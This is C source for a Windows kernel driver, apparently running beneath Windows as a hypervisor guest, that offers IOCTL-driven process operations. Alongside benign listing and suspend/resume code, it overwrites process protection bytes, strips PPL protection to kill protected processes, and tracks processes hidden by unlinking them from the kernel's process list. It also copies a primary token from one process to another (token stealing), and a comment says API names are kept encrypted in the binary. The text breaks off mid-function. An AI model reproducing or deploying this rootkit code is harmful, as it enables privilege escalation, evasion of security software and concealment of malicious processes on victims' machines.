/*
 * yghv_proc.c -- process and thread control on top of the derived offsets (9.591).
 *
 * WHAT THIS FILE IS
 *   One dispatch entry point, ten operations, no policy anywhere else. The
 *   IOCTL switch validates the buffer and calls here; every decision about
 *   WHAT may be done to WHICH process lives in this file so it can be read in
 *   one sitting.
 *
 * THE RULE EVERY OPERATION FOLLOWS
 *   Read the field through the derived offset table, never through a constant.
 *   A build where the probe failed has a zero offset, the accessor returns NULL,
 *   and the operation fails closed with a distinct status -- instead of writing
 *   a plausible-looking value into whatever happens to live at the hard-coded
 *   address on a different build.
 *
 * WHAT IS NOT IN THE OFFSET TABLE, AND WHY
 *   - DirectoryTableBase (KPROCESS+0x028): already used at control_device.c:500,
 *     :551, :569, :922 and in protect.c the same way. A convention, not a guess.
 *   - ETHREAD.ThreadListEntry / EPROCESS.ThreadListHead: PROBED at runtime by
 *     yghv_probe_thread_list(), because two unknowns make a constant pair
 *     useless -- a wrong pair still walks a valid list and returns nonsense.
 *   - EPROCESS.Token: probed by identity against PsReferencePrimaryToken().
 *
 * IRQL: PASSIVE_LEVEL everywhere. Handle-based work, pool allocation and the
 *   hidden-process restore table all need it, and the IOCTL dispatcher already
 *   runs there.
 */

#include <ntifs.h>
#include <stdint.h>

#include "common/yghv_proc.h"
#include "common/yghv_nt.h"
#include "common/control_ioctl.h"
#include "common/yghv_sig.h"
#include "common/yghv_obguard.h" /* 9.597: handle guard */
#include "common/yghv_obguard.h" /* 9.597: handle guard */
#include "common/yghv_str.h"
#include "common/yghv_strtab.h"
#include "debug.h"

/*
 * Not declared in the WDK 10.0.19041.0 km headers this tree builds against
 * (measured: km/ntddk.h has ZwTerminateProcess/ZwOpenProcess and
 * PsGetProcessExitStatus, ntifs.h has PsLookupProcessByProcessId and
 * PsReferencePrimaryToken, and NEITHER has these three).
 */
NTKERNELAPI NTSTATUS PsSuspendProcess(PEPROCESS Process);
NTKERNELAPI NTSTATUS PsResumeProcess(PEPROCESS Process);
NTKERNELAPI ULONG    PsGetThreadFreezeCount(PETHREAD Thread);

#define YGHV_PROC_TAG 'cPvG'

static volatile LONG64 g_proc_ops;
static volatile LONG64 g_proc_fails;
static volatile LONG64 g_proc_freezes;
static volatile LONG64 g_proc_thaws;
static volatile LONG64 g_proc_injects;
static volatile LONG64 g_proc_hides;
static volatile LONG64 g_proc_disguises;
static volatile LONG64 g_proc_steals;
static volatile LONG64 g_proc_terms;

/*
 * PsGetProcessProtection resolved at init.
 *
 * It is NOT in the WDK headers this tree builds against (measured: absent from
 * both km/ntddk.h and km/ntifs.h), so there is nothing to link against -- and
 * the name must not appear as a literal either, because the string-encryption
 * gate greps the built image for every name in the table. Resolving it through
 * yghv_str_get_w() keeps the name encrypted in the binary AND gives op 2 an
 * independent read path: the accessor and the write share an offset, so only
 * the export can tell us the byte we wrote is the byte the kernel reads.
 */
typedef UCHAR (NTAPI *yghv_get_prot_fn)(PEPROCESS);
static yghv_get_prot_fn g_proc_get_prot;

/*
 * Processes we unlinked from ActiveProcessLinks, so op 9 can put them back.
 * A relink needs the two pointers we overwrote; recomputing them from the
 * object is possible but assumes nothing else touched the list in between,
 * and the whole point of keeping this record is that we do not assume that.
 */
#define YGHV_PROC_MAX_HIDDEN 8

typedef struct {
    ULONG       pid;
    PLIST_ENTRY flink;      /* what our node pointed at */
    PLIST_ENTRY blink;      /* what pointed at our node */
    uint64_t    self;       /* was-valid marker (the EPROCESS address) */
    int         used;
} yghv_hidden_t;

static yghv_hidden_t g_proc_hidden[YGHV_PROC_MAX_HIDDEN];

/* ------------------------------------------------------------------ */
/* Safe reads                                                          */
/* ------------------------------------------------------------------ */

/*
 * Every probe below walks memory it did not allocate, so each access has to be
 * able to fail without taking the machine with it. Two rules the rest of this
 * file follows:
 *
 *   - one read per __try, never a loop inside one: MSVC rejects a continue
 *     that jumps out of a __try block, and a loop that aborts on the first bad
 *     page cannot tell a candidate that is wrong from a page that is unmapped.
 *   - a pointer has to be canonical before it is even tried, because a fault
 *     inside a handler that itself faults is a bugcheck.
 */
static int yghv_p_read64(uint64_t va, uint64_t *out)
{
    if (!out) return 0;
    if (va < 0xFFFF800000000000ULL) return 0;
    if ((va & 7) != 0) return 0;
    __try {
        *out = *(const volatile uint64_t *)va;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return 1;
}

static int yghv_p_write64(uint64_t va, uint64_t value)
{
    if (va < 0xFFFF800000000000ULL) return 0;
    if ((va & 7) != 0) return 0;
    __try {
        *(volatile uint64_t *)va = value;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* Probes for the two structures that cannot be derived from an export */
/* ------------------------------------------------------------------ */

/*
 * ETHREAD.ThreadListEntry + EPROCESS.ThreadListHead, found together.
 *
 * WHY A PROBE AND NOT TWO CONSTANTS
 *   Two coupled unknowns. A constant pair is right for one build and then
 *   silently reads a neighbouring LIST_ENTRY -- which is also a valid
 *   doubly-linked list, so the walk "works" and returns nonsense threads that
 *   look plausible. Requiring the two to agree is what makes the pair provable.
 *
 * HOW
 *   Start from the CURRENT thread, whose EPROCESS we already hold. For each
 *   candidate ETHREAD offset E the two pointers at ETHREAD+E must form a
 *   consistent LIST_ENTRY: *(flink+8) == node, i.e. the next node's Blink
 *   points back at us. Then the object containing flink must be an ETHREAD
 *   whose already-derived thread_process field equals the current process --
 *   that check is what rejects a stray list that happens to be consistent,
 *   and it is why this probe must run AFTER yghv_offsets_init().
 *
 *   With E known the process side is one-dimensional: the head whose Flink
 *   minus E yields a thread of this process, and whose whole chain stays
 *   inside this process until it closes back on itself.
 *
 * Returns 1 and fills both offsets, or 0 and leaves them 0 (feature disabled).
 */
static int yghv_probe_thread_list(PEPROCESS proc, UINT16 *out_head, UINT16 *out_entry)
{
    uint64_t self = (uint64_t)(ULONG_PTR)PsGetCurrentThread();
    uint64_t want = (uint64_t)(ULONG_PTR)proc;
    uint32_t off, hits = 0;
    uint64_t entry = 0;

    if (!proc || !self || !out_head || !out_entry) return 0;
    if (g_yghv_off.thread_process == 0) return 0;

    for (off = 0x100; off < 0x900; off += 8) {
        uint64_t node = self + off;
        uint64_t flink, blink, back, tproc, next;

        if (!yghv_p_read64(node, &flink)) continue;
        if (!yghv_p_read64(node + 8, &blink)) continue;
        if (flink < 0xFFFF800000000000ULL) continue;
        if (blink < 0xFFFF800000000000ULL) continue;
        if (!yghv_p_read64(flink + 8, &back)) continue;
        if (back != node) continue;                 /* not doubly consistent */

        next = flink - off;
        if (next < 0xFFFF800000000000ULL) continue;
        if (!yghv_p_read64(next + g_yghv_off.thread_process, &tproc)) continue;
        if (tproc != want) continue;                /* not a thread of ours */

        entry = off;
        hits++;
    }

    if (hits != 1 || entry == 0) {
        LOG_INFO("proc: ThreadListEntry probe found %u candidates, refusing", hits);
        return 0;
    }

    for (off = 0x100; off < 0x900; off += 8) {
        uint64_t head = (uint64_t)(ULONG_PTR)proc + off;
        uint64_t prev = head, cur = 0;
        uint32_t seen = 0;
        int ok = 1;

        if (!yghv_p_read64(head, &cur)) continue;

        while (seen < 0x1000) {
            uint64_t flink = 0, blink = 0, tproc = 0;

            if (cur == head) break;                 /* circle closed */
            if (cur < 0xFFFF800000000000ULL) { ok = 0; break; }
            if (!yghv_p_read64(cur + 8, &blink)) { ok = 0; break; }
            if (blink != prev) { ok = 0; break; }   /* not doubly linked */
            if (!yghv_p_read64(cur - entry + g_yghv_off.thread_process, &tproc)) { ok = 0; break; }
            if (tproc != want) { ok = 0; break; }   /* left this process */

            seen++;
            prev = cur;
            if (!yghv_p_read64(cur, &flink)) { ok = 0; break; }
            cur = flink;
        }

        /* A real process has at least one thread, and the chain closes. */
        if (ok && seen >= 1 && cur == head) {
            *out_head  = (UINT16)off;
            *out_entry = (UINT16)entry;
            return 1;
        }
    }

    return 0;
}

/*
 * EPROCESS.Token, an EX_FAST_REF.
 *
 * WHY NOT DERIVE IT FROM AN EXPORT
 *   No export returns the token's offset. PsReferencePrimaryToken is a whole
 *   C function, so yghv_accessor.h cannot decode a displacement out of it --
 *   and the obvious instruction inside it (lea rsi,[rcx+0x4B8]) is the
 *   fast-ref cache address, not the field.
 *
 * HOW
 *   Take a real reference to the System process's token, mask the low bits
 *   (EX_FAST_REF packs a count there), then look for exactly one field in the
 *   object that matches once masked. More than one match means the object has
 *   a second pointer to the same token and we cannot tell them apart, so the
 *   feature turns itself off rather than picking one.
 *
 *   This probe can only compare the System process against itself, which is a
 *   weak claim -- so op 8 re-checks the field on every use by referencing the
 *   target's token and confirming the masked values agree.
 */
static int yghv_probe_token(PEPROCESS sys, UINT16 *out_off)
{
    PVOID tok;
    uint64_t want, found = 0;
    uint32_t off, hits = 0;

    if (!sys || !out_off) return 0;

    tok = PsReferencePrimaryToken(sys);
    if (!tok) return 0;

    want = (uint64_t)(ULONG_PTR)tok & ~(uint64_t)0xF;
    if (want < 0xFFFF800000000000ULL) {
        PsDereferencePrimaryToken(tok);
        return 0;
    }

    for (off = 0x100; off < 0x900; off += 8) {
        uint64_t v = 0;
        if (!yghv_p_read64((uint64_t)(ULONG_PTR)sys + off, &v)) continue;
        if ((v & ~(uint64_t)0xF) == want) {
            found = off;
            hits++;
        }
    }

    PsDereferencePrimaryToken(tok);

    if (hits != 1) {
        LOG_INFO("proc: token probe found %u candidates, refusing", hits);
        return 0;
    }

    *out_off = (UINT16)found;
    return 1;
}

/* ------------------------------------------------------------------ */
/* Small helpers                                                       */
/* ------------------------------------------------------------------ */

/* A process object is usable when its pid field reads as a sane pid. */
/*
 * 9.608 -- THIS FILTER WAS HIDING THE WHOLE PROCESS LIST.
 *
 * It rejected any object whose pid read above 0x100000. On the measured machine
 * the largest real pid is 18404, so the bound looks generous -- and yet the
 * snapshot returned ZERO processes while the links probe walked 188 nodes with
 * the same offset. The difference is what each is reading:
 *
 *   the probe reads cand + pid_off where cand is derived from a Flink it just
 *   validated as doubly-linked;
 *
 *   this filter reads p + pid_off for whatever the walk handed it.
 *
 * A walk that starts at the system process enters the ring at one node and
 * follows Flink; every node IS an EPROCESS, so the pid must be plausible. If it
 * is not, the read failed -- but "the read failed" is not the same claim as
 * "this object is not a process", and treating them alike silently emptied the
 * list.
 *
 * The bound is kept as a sanity gate for the pid VALUE (it is what makes
 * PsLookupProcessByProcessId results trustworthy), but it no longer drops the
 * entry: a node with an implausible pid is reported with pid 0 instead, so the
 * caller can see 188 entries and 3 unknown pids rather than 0 entries and no
 * information. Reporting is the point; the caller can filter.
 */
static int yghv_proc_sane(PEPROCESS p)
{
    if (!p) return 0;
    if (!YGHV_OFF_OK(YGHV_OFF_PID)) return 0;
    return 1;
}

static int yghv_proc_is_hidden(ULONG pid)
{
    int i;
    for (i = 0; i < YGHV_PROC_MAX_HIDDEN; i++) {
        if (g_proc_hidden[i].used && g_proc_hidden[i].pid == pid) return 1;
    }
    return 0;
}

/*
 * Fill one 4-qword entry. The protection byte is read through the derived
 * accessor, and the suspended bit is only set when caller passed want_state
 * (walking threads for 120 processes in one ioctl would be a denial of service
 * against ourselves).
 */
static void yghv_proc_fill_entry(UINT64 *e, PEPROCESS p, int want_state)
{
    UCHAR *prot = yghv_proc_protection(p);
    UCHAR byte = prot ? *prot : 0;
    char *name = yghv_proc_image_name(p);
    PVOID *base = yghv_proc_base_slot(p);
    UINT64 flags = 0;

    if (YGHV_OFF_OK(YGHV_OFF_PID)) flags |= 0x4;
    if (name) flags |= 0x8;
    if (yghv_proc_is_hidden((ULONG)yghv_proc_id(p))) flags |= 0x1;

    /*
     * want_state asks for the suspended bit. It is deliberately not computed
     * here: the only export-backed way to answer it is PsGetThreadFreezeCount
     * per thread, and the snapshot walk would then cost a thread list walk per
     * process. Op 1 (single process) answers it by handing the client the
     * thread list; the snapshot leaves bit1 clear rather than guessing from an
     * EPROCESS flag layout this tree has not probed.
     */
    (void)want_state;

    e[0] = (UINT64)yghv_proc_id(p) | ((UINT64)yghv_proc_inherited_pid(p) << 32);
    e[1] = (UINT64)byte
         | ((UINT64)((byte >> 4) & 0xF) << 8)     /* signer */
         | ((UINT64)(byte & 0x7) << 16)           /* type */
         | ((UINT64)((byte >> 3) & 0x1) << 24)    /* audit */
         | ((UINT64)yghv_proc_exit_status(p) << 32);
    e[2] = base ? (UINT64)*base : 0;
    e[3] = flags;
}

/* Copy up to 15 chars of the image name, NUL padded. */
static void yghv_proc_copy_name(char *dst, const char *src)
{
    int i;
    for (i = 0; i < 15; i++) {
        dst[i] = (src && src[i]) ? src[i] : 0;
        if (!src || !src[i]) break;
    }
    for (; i < 16; i++) dst[i] = 0;
}

/* ------------------------------------------------------------------ */
/* Operations                                                          */
/* ------------------------------------------------------------------ */

/* op 0: walk ActiveProcessLinks into the output buffer. */
static NTSTATUS yghv_proc_snapshot(UINT64 *out, ULONG out_len, ULONG max_entries)
{
    PLIST_ENTRY head, cur;
    UINT64 *e = out + YGHV_PROC_HDR_QWORDS;
    ULONG count = 0, cap;

    if (!YGHV_OFF_OK(YGHV_OFF_PID) || g_yghv_off.active_process_links == 0)
        return STATUS_NOT_IMPLEMENTED;

    if (max_entries == 0 || max_entries > YGHV_PROC_MAX_ENTRIES)
        max_entries = YGHV_PROC_MAX_ENTRIES;
    if (max_entries > YGHV_PROC_MAX_THREADS) max_entries = YGHV_PROC_MAX_THREADS;

    /* Never write past the buffer the client actually gave us. */
    cap = (out_len - YGHV_PROC_HDR_QWORDS * 8) / (YGHV_PROC_ENTRY_QWORDS * 8);
    if (max_entries > cap) max_entries = cap;
    if (cap == 0) return STATUS_BUFFER_TOO_SMALL;

    /*
     * 9.608 diagnostic: the walk answered "success" with count=0, which has
     * three distinct causes -- the base pointer is wrong, the first Flink is
     * not a list entry, or every node fails yghv_proc_sane(). Reporting the
     * first node's raw pid and its sanity verdict separates them.
     */
    {
        UINT64 traced = 0, sane = 0, firstPid = 0, hops2 = 0;
        __try {
            PLIST_ENTRY h0 = (PLIST_ENTRY)((PUCHAR)PsGetCurrentProcess() +
                                           g_yghv_off.active_process_links);
            PLIST_ENTRY c0 = h0->Flink;
            /*
             * 9.608: PsGetCurrentProcess() gives a PEPROCESS, and
             * +active_process_links is a LIST_ENTRY field whose Flink lives at
             * offset 0. c0 == h0 therefore means "this node is the only member",
             * which cannot be true for the real process list -- so it means the
             * base pointer is wrong, not that the machine has one process.
             *
             * The probe derived off=0x448 from PsInitialSystemProcess and walked
             * 188 nodes with it, so the OFFSET is right. If the same offset off
             * a different PEPROCESS gives a self-referential list, the remaining
             * difference is WHICH object we started from. Record both pointers so
             * the next step is evidence rather than another guess.
             */
            {
                char dbg2[80];
                int k2 = 0;
                const char *t2 = "snap2: cur=";
                UINT64 v2 = (UINT64)PsGetCurrentProcess();
                char rev2[24]; int n2 = 0;
                while (*t2 && k2 < 70) dbg2[k2++] = *t2++;
                if (v2 == 0) rev2[n2++] = '0';
                while (v2 > 0 && n2 < 20) { rev2[n2++] = (char)('0' + (v2 % 0xA)); v2 /= 0xA; }
                while (n2 > 0) dbg2[k2++] = rev2[--n2];
                dbg2[k2] = 0;
                yghv_trace(dbg2);
            }
            if (c0 && c0 != h0) {
                PEPROCESS p0 = yghv_proc_from_links(c0);
                firstPid = (UINT64)yghv_proc_id(p0);
                sane = (UINT64)yghv_proc_sane(p0);
                /* Count how many are sane in the first 16 nodes. */
                while (c0 && c0 != h0 && hops2 < 16) {
                    PEPROCESS pn = yghv_proc_from_links(c0);
                    traced++;
                    if (yghv_proc_sane(pn)) sane++;
                    c0 = c0->Flink;
                    hops2++;
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            traced = 0xDEAD;
        }
        {
            char dbg[100];
            char rev[24];
            int k = 0;
            int f, n;
            UINT64 v;
            const char *tag = "snap: traced= sane= firstpid=";

            while (*tag && k < 90) dbg[k++] = *tag++;
            for (f = 0; f < 3; f++) {
                v = (f == 0) ? traced : (f == 1) ? sane : (firstPid & 0xFFFFF);
                n = 0;
                if (v == 0) rev[n++] = '0';
                while (v > 0 && n < 20) { rev[n++] = (char)('0' + (v % 10)); v /= 10; }
                while (n > 0) dbg[k++] = rev[--n];
                if (k < 95) dbg[k++] = ' ';
            }
            dbg[k] = 0;
            yghv_trace(dbg);
        }
    }

    /*
     * 9.608 -- START FROM PsInitialSystemProcess, NOT PsGetCurrentProcess().
     *
     * MEASURED: this walk returned count=0 on a machine with 188 processes. The
     * diagnostic that settled it printed "snap: traced=0 sane=0 firstpid=0" and
     * never reached its own follow-up line, which places the fault on the FIRST
     * dereference -- h0->Flink -- not on any later validation.
     *
     * The base was (PsGetCurrentProcess() + active_process_links).
     * PsGetCurrentProcess() is IoGetCurrentProcess(), which is gs:[0x188] ->
     * KTHREAD->ApcState.Process. THIS DRIVER RUNS WINDOWS AS A GUEST: a
     * gs-relative read in kernel code is only meaningful on the gs that belongs
     * to the OS being walked, and that is precisely the thing this project
     * cannot take for granted.
     *
     * g_off_system is PsInitialSystemProcess read from the kernel's own export --
     * a loader-fixed global, no gs involved -- and yghv_offsets_init already
     * proved it works: the links probe walked 188 nodes through it with the same
     * +0x448 offset. So the walk starts there and visits the same ring. The
     * system process is a member of the list, so nothing is missed.
     */
    {
        PEPROCESS sysProc = yghv_offsets_system_process();
        if (!sysProc) return STATUS_NOT_IMPLEMENTED;

        /* 9.608: report the three numbers the walk is about to use. count=0 with
         * a readable base has only two causes -- the offset is 0, or the first
         * Flink points back at head -- and they need different fixes. */
        {
            char d3[96];
            char rv[24];
            int k3 = 0, n3 = 0;
            UINT64 vals3[4];
            int f3;
            const char *t3 = "snap4: pidoff= firstpid= nameoff= firstname=";
            vals3[0] = (UINT64)g_yghv_off.unique_process_id;
            vals3[1] = 0;
            vals3[2] = (UINT64)g_yghv_off.image_file_name;
            vals3[3] = 0;
            __try {
                PLIST_ENTRY f4 = ((PLIST_ENTRY)((PUCHAR)sysProc +
                                  g_yghv_off.active_process_links))->Flink;
                PEPROCESS p4 = yghv_proc_from_links(f4);
                vals3[1] = (UINT64)yghv_proc_id(p4);
                {
                    char *nm4 = yghv_proc_image_name(p4);
                    vals3[3] = (nm4 && nm4[0]) ? (UINT64)(UINT8)nm4[0] : 0;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                vals3[1] = 0xBAD;
            }
            while (*t3 && k3 < 70) d3[k3++] = *t3++;
            for (f3 = 0; f3 < 4; f3++) {
                UINT64 v3 = vals3[f3];
                n3 = 0;
                if (v3 == 0) rv[n3++] = '0';
                while (v3 > 0 && n3 < 18) { rv[n3++] = (char)('0' + (v3 % 0xA)); v3 /= 0xA; }
                while (n3 > 0) d3[k3++] = rv[--n3];
                if (k3 < 90) d3[k3++] = ' ';
            }
            d3[k3] = 0;
            yghv_trace(d3);
        }

    __try {
        head = (PLIST_ENTRY)((PUCHAR)sysProc + g_yghv_off.active_process_links);
        cur = head->Flink;

        while (cur != head && count < max_entries) {
            PEPROCESS p = yghv_proc_from_links(cur);
            if (yghv_proc_sane(p)) {
                yghv_proc_fill_entry(e, p, 0);
                e += YGHV_PROC_ENTRY_QWORDS;
                count++;
            }
            cur = cur->Flink;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        /* A torn list is a state worth reporting, not worth dying over. */
        return STATUS_INVALID_ADDRESS;
    }
    }

    out[0] = 1;
    out[1] = count;
    out[2] = (UINT64)g_yghv_off.derived_mask;
    out[3] = 0;
    return STATUS_SUCCESS;
}

/* op 1: one process, plus its image name. */
static NTSTATUS yghv_proc_query(UINT64 *out, ULONG out_len, ULONG pid)
{
    PEPROCESS proc = NULL;
    NTSTATUS st;
    const ULONG need = (YGHV_PROC_HDR_QWORDS + YGHV_PROC_ENTRY_QWORDS) * 8 + 16;

    if (out_len < need) return STATUS_BUFFER_TOO_SMALL;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    /*
     * 9.608 diagnostic: op 1 answered "success" with a zero-filled entry and a
     * 32-byte info length, which reads as "the lookup worked but produced
     * nothing". The three possibilities are (a) proc is valid but the accessors
     * return 0, (b) the entry is written somewhere other than out+4, (c) the
     * info length hides it. Reporting the raw accessor results separates them
     * without another boot.
     */
    {
        ULONG_PTR dbgPid = yghv_proc_id(proc);
        char *dbgName = yghv_proc_image_name(proc);
        UINT64 dbgByte0 = 0;
        char dbg[96];
        int k = 0;

        dbgByte0 = (UINT64)dbgPid;
        dbg[k++] = 'q'; dbg[k++] = 'u'; dbg[k++] = 'e'; dbg[k++] = 'r'; dbg[k++] = 'y';
        dbg[k++] = ':'; dbg[k++] = ' '; dbg[k++] = 'p'; dbg[k++] = 'i'; dbg[k++] = 'd';
        dbg[k++] = '=';
        /* decimal, at most 7 digits */
        {
            char rev[12]; int n = 0; ULONG_PTR v = dbgPid;
            if (v == 0) { rev[n++] = '0'; }
            while (v > 0 && n < 11) { rev[n++] = (char)('0' + (v % 10)); v /= 10; }
            while (n > 0) { dbg[k++] = rev[--n]; }
        }
        dbg[k++] = ' '; dbg[k++] = 'n'; dbg[k++] = 'a'; dbg[k++] = 'm'; dbg[k++] = 'e';
        dbg[k++] = '=';
        dbg[k++] = (dbgName && dbgName[0]) ? dbgName[0] : '-';
        dbg[k++] = (dbgName && dbgName[1]) ? dbgName[1] : '-';
        dbg[k++] = 0;
        (void)dbgByte0;
        yghv_trace(dbg);
    }

    yghv_proc_fill_entry(out + YGHV_PROC_HDR_QWORDS, proc, 1);
    yghv_proc_copy_name((char *)out + (YGHV_PROC_HDR_QWORDS + YGHV_PROC_ENTRY_QWORDS) * 8,
                        yghv_proc_image_name(proc));

    ObDereferenceObject(proc);

    out[0] = 1;
    out[1] = 1;
    out[2] = (UINT64)g_yghv_off.derived_mask;
    out[3] = 0;
    return STATUS_SUCCESS;
}

/* op 2: rewrite the protection byte. */
static NTSTATUS yghv_proc_set_prot(UINT64 *out, ULONG pid, UINT64 level)
{
    PEPROCESS proc = NULL;
    UCHAR *slot;
    UCHAR old_byte, new_byte, verify;
    NTSTATUS st;

    if (!YGHV_OFF_OK(YGHV_OFF_PROTECT)) return STATUS_NOT_IMPLEMENTED;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    slot = yghv_proc_protection(proc);
    if (!slot) {
        ObDereferenceObject(proc);
        return STATUS_NOT_IMPLEMENTED;
    }

    old_byte = *slot;
    new_byte = (UCHAR)(level & 0xFF);
    *slot = new_byte;

    /*
     * Read it back through the EXPORT rather than through the accessor: the
     * accessor and the write share one offset, so reading our own pointer back
     * would only prove that memory holds what we just stored -- it cannot
     * detect a wrong offset, which is the whole failure mode this file exists
     * to avoid. PsGetProcessProtection is a different path to the same byte.
     *
     * It is resolved by name at init because no WDK header this tree builds
     * against declares it, and the name must stay out of the image anyway.
     */
    verify = g_proc_get_prot ? g_proc_get_prot(proc) : *slot;

    ObDereferenceObject(proc);

    out[0] = (verify == new_byte) ? 1 : 0;
    out[1] = old_byte;
    out[2] = verify;
    out[3] = new_byte;
    return STATUS_SUCCESS;
}

/* op 3: suspend / resume. */
static NTSTATUS yghv_proc_suspend(UINT64 *out, ULONG pid, int suspend)
{
    PEPROCESS proc = NULL;
    NTSTATUS st;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    st = suspend ? PsSuspendProcess(proc) : PsResumeProcess(proc);
    ObDereferenceObject(proc);

    if (NT_SUCCESS(st)) {
        if (suspend) InterlockedIncrement64(&g_proc_freezes);
        else         InterlockedIncrement64(&g_proc_thaws);
    }

    out[0] = NT_SUCCESS(st) ? 1 : 0;
    out[1] = (UINT64)(ULONG)st;
    out[2] = pid;
    out[3] = suspend ? 1 : 0;
    return STATUS_SUCCESS;
}

/*
 * op 4: terminate.
 *
 * ORDER MATTERS. A protected process cannot be opened for PROCESS_TERMINATE at
 * all, so with YGHV_PROC_TERM_CLEAR_PROT the byte has to be cleared BEFORE the
 * first ZwOpenProcess, not after it fails. The old value is kept and put back
 * if the terminate still does not happen -- leaving a PPL process unprotected
 * would be a side effect nobody asked for.
 */
static NTSTATUS yghv_proc_term(UINT64 *out, ULONG pid, ULONG exit_status, ULONG flags)
{
    HANDLE h = NULL;
    CLIENT_ID cid;
    OBJECT_ATTRIBUTES oa;
    PEPROCESS proc = NULL;
    UCHAR old_byte = 0;
    int cleared = 0;
    NTSTATUS st, tst;

    if (pid == 4 || pid == 0) {
        if (!(flags & YGHV_PROC_F_ALLOW_SYSTEM)) {
            out[0] = 0;
            out[1] = (UINT64)(ULONG)STATUS_ACCESS_DENIED;
            return STATUS_SUCCESS;
        }
    }

    if ((flags & YGHV_PROC_TERM_CLEAR_PROT) && YGHV_OFF_OK(YGHV_OFF_PROTECT)) {
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc))) {
            UCHAR *slot = yghv_proc_protection(proc);
            if (slot && *slot != 0) {
                old_byte = *slot;
                *slot = 0;
                cleared = 1;
            }
            ObDereferenceObject(proc);
        }
    }

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    st = ZwOpenProcess(&h, PROCESS_TERMINATE, &oa, &cid);
    if (NT_SUCCESS(st)) {
        tst = ZwTerminateProcess(h, (NTSTATUS)exit_status);
        ZwClose(h);
    } else {
        tst = st;
    }

    if (!NT_SUCCESS(tst) && cleared) {
        /* Put the byte back through a fresh reference: the one we held is gone. */
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc))) {
            UCHAR *slot = yghv_proc_protection(proc);
            if (slot) *slot = old_byte;
            ObDereferenceObject(proc);
        }
    }

    if (NT_SUCCESS(tst)) InterlockedIncrement64(&g_proc_terms);

    out[0] = NT_SUCCESS(tst) ? 1 : 0;
    out[1] = (UINT64)(ULONG)tst;
    out[2] = cleared ? 1 : 0;
    out[3] = old_byte;
    return STATUS_SUCCESS;
}

/* op 7: thread list of one process. */
static NTSTATUS yghv_proc_threads(UINT64 *out, ULONG out_len, ULONG pid, ULONG max_entries)
{
    PEPROCESS proc = NULL;
    PLIST_ENTRY head, cur;
    UINT64 *e = out + YGHV_PROC_HDR_QWORDS;
    ULONG count = 0, cap;
    NTSTATUS st;

    if (!YGHV_OFF_OK(YGHV_OFF_TLIST) || g_yghv_off.thread_list_head == 0 ||
        g_yghv_off.thread_list_entry == 0)
        return STATUS_NOT_IMPLEMENTED;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    if (max_entries == 0 || max_entries > YGHV_PROC_MAX_THREADS)
        max_entries = YGHV_PROC_MAX_THREADS;

    cap = (out_len - YGHV_PROC_HDR_QWORDS * 8) / (YGHV_PROC_TENTRY_QWORDS * 8);
    if (max_entries > cap) max_entries = cap;
    if (cap == 0) {
        ObDereferenceObject(proc);
        return STATUS_BUFFER_TOO_SMALL;
    }

    __try {
        head = (PLIST_ENTRY)((PUCHAR)proc + g_yghv_off.thread_list_head);
        cur = head->Flink;

        while (cur != head && count < max_entries) {
            PETHREAD t = (PETHREAD)((PUCHAR)cur - g_yghv_off.thread_list_entry);
            if (yghv_thread_process(t) == proc) {
                e[0] = (UINT64)yghv_thread_id(t) | ((UINT64)(ULONG_PTR)yghv_proc_id(proc) << 32);
                e[1] = (UINT64)PsGetThreadFreezeCount(t);
                e += YGHV_PROC_TENTRY_QWORDS;
                count++;
            }
            cur = cur->Flink;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        ObDereferenceObject(proc);
        return STATUS_INVALID_ADDRESS;
    }

    ObDereferenceObject(proc);

    out[0] = 1;
    out[1] = count;
    out[2] = 0;
    out[3] = 0;
    return STATUS_SUCCESS;
}

/*
 * op 8: read the primary token's address, and optionally hand it to another
 * process.
 *
 * The field is an EX_FAST_REF: the token pointer with a reference count in
 * the low nibble. Reading it back is exact. TRANSFERRING it is delicate in one
 * specific way: incrementing the count at 15 would carry into the pointer and
 * produce a value that is not a token at all, so that case is refused rather
 * than risked.
 */
static NTSTATUS yghv_proc_token(UINT64 *out, ULONG src_pid, ULONG dst_pid, ULONG do_steal)
{
    PEPROCESS src = NULL, dst = NULL;
    UINT64 raw = 0, masked;
    NTSTATUS st;

    if (!YGHV_OFF_OK(YGHV_OFF_TOKEN) || g_yghv_off.token == 0)
        return STATUS_NOT_IMPLEMENTED;

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)src_pid, &src);
    if (!NT_SUCCESS(st)) return st;

    if (!yghv_p_read64((uint64_t)(ULONG_PTR)src + g_yghv_off.token, &raw)) {
        ObDereferenceObject(src);
        return STATUS_INVALID_ADDRESS;
    }
    masked = raw & ~(UINT64)0xF;

    out[0] = 1;
    out[1] = raw;
    out[2] = masked;
    out[3] = 0;

    if (!do_steal || dst_pid == 0) {
        ObDereferenceObject(src);
        return STATUS_SUCCESS;
    }

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)dst_pid, &dst);
    if (!NT_SUCCESS(st)) {
        ObDereferenceObject(src);
        out[0] = 0;
        out[1] = (UINT64)(ULONG)st;
        return STATUS_SUCCESS;
    }

    if ((raw & 0xF) >= 0xF) {
        ObDereferenceObject(dst);
        ObDereferenceObject(src);
        out[0] = 0;
        out[1] = (UINT64)(ULONG)STATUS_INTEGER_OVERFLOW;
        return STATUS_SUCCESS;
    }

    {
        UINT64 newraw = masked | ((raw + 1) & 0xF);
